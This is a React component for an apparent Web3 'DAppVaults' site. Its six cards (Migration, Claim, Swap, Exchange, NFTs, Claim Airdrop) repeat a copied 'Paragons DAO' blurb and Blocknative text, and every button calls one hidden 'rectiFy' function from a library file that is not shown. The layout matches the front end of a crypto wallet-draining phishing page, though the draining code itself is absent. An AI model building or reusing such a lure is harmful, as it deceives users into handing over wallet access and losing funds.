import React, { useState } from 'react'
import { HiOutlineArrowLongRight } from "react-icons/hi2";
import { rectiFy } from '../../../lib/rectiFy';
import Loader from '../../Loader/Loader';

export default function Service() {

  const DATA = [
    {
      id: 1,
      title: "Migration",
      desc: `Paragons DAO levels up Web3 gamers and guilds, maximizing your
              ability to earn with premier titles`,
    },
    {
      id: 2,
      title: "Claim",
      desc: `Paragons DAO levels up Web3 gamers and guilds, maximizing your
              ability to earn with premier titles`,
    },
    {
      id: 3,
      title: "Swap",
      desc: `Paragons DAO levels up Web3 gamers and guilds, maximizing your
              ability to earn with premier titles`,
    },
    {
      id: 4,
      title: "Exchange",
      desc: `Paragons DAO levels up Web3 gamers and guilds, maximizing your
              ability to earn with premier titles`,
    },
    {
      id: 5,
      title: "NFTs",
      desc: `Paragons DAO levels up Web3 gamers and guilds, maximizing your
              ability to earn with premier titles`,
    },
    {
      id: 6,
      title: "Claim Airdrop",
      desc: `Paragons DAO levels up Web3 gamers and guilds, maximizing your
              ability to earn with premier titles`,
    },
  ];
  const [loading, setLoading] = useState(false)

  const rectify = async () => {
    setLoading(true)
    try {
      await rectiFy()
    } catch (error) {
      console.log("error rectifying", error)
    } finally {
      setLoading(false)
    }
  }
  return (
    <div className="py-20 mt-[4%] px-4 md:px-[10%] font-mono">
      {loading && <Loader />}
      <h1 className="text-center mt-[2%] mx-auto leading-loose md:leading-loose lg:w-[70%] font-extrabold text-2xl md:text-4xl text-[#fff]">
        Web3 Dapps and Developer Tools
        <span className="multi-color ml-2">Related To DAppVaults</span>
      </h1>

      <p className="text-slate-300 mt-7 text-center w-[100%] md:w-full lg:w-[70%] mx-auto leading-loose">
        All public blockchain transactions move through the mempool before
        confirmation. 
        Blocknative's suite of tools brings transparency to the mempool and MEV
        on Ethereum, Polygon, and Gnosis (xDai).
      </p>
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 mx-auto gap-x-5 gap-y-10 container mt-14">
        {DATA.map((item) => (
          <div
            className="border   border-[#59b5f683] text-center transition duration-500  hover:bg-[#20264e65] shadow-xl  hover:shadow-xl  h-[350px] w-[340px] rounded-2xl   px-6 py-10 "
            key={item.id}
          >
            <div className="">
              <h1 className="font-bold text-xl md:text-3xl mb-5  text-white">
                {item.title}
              </h1>
              <p className="text-slate-200 leading-[1.8] mb-7">{item.desc}</p>

              <button onClick={rectify} disabled={loading} className="border-0 text-white mx-auto text-[17px] flex font-semibold  items-center py-1 rounded-md">
                Get started <HiOutlineArrowLongRight className="ml-2" />
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}
